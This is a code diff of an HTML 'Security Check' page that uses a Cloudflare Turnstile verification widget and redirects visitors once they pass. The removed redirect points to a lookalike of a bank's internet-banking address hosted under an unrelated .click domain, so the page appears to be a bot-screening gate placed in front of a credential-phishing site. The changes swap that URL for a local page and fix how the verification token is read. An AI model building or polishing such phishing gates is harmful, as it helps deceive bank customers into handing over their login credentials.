@@ -2,8 +2,6 @@
 <html>
 <head>
   <title>Security Check</title>
-
-  <!-- Turnstile script (loads the widget) -->
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </head>
 
@@ -11,7 +9,6 @@
 
 <h2>Verify you are human</h2>
 
-<!-- 1. FORM + TURNSTILE WIDGET -->
 <form id="myForm">
 
   <div class="cf-turnstile"
@@ -22,12 +19,12 @@
 
 </form>
 
-<!-- 2. JAVASCRIPT (same file) -->
 <script>
 document.getElementById("myForm").addEventListener("submit", async (e) => {
   e.preventDefault();
 
-  const token = document.querySelector('[name="cf-turnstile-response"]').value;
+  // ✅ Correct way to get token
+  const token = turnstile.getResponse();
 
   if (!token) {
     alert("Please complete verification");
@@ -43,7 +40,7 @@ document.getElementById("myForm").addEventListener("submit", async (e) => {
   const data = await res.json();
 
   if (data.success) {
-    window.location.href = "https://ib.boq.com.au.autocheck.click/mybq/index.html";
+    window.location.href = "index.html";
   } else {
     alert("Verification failed");
   }
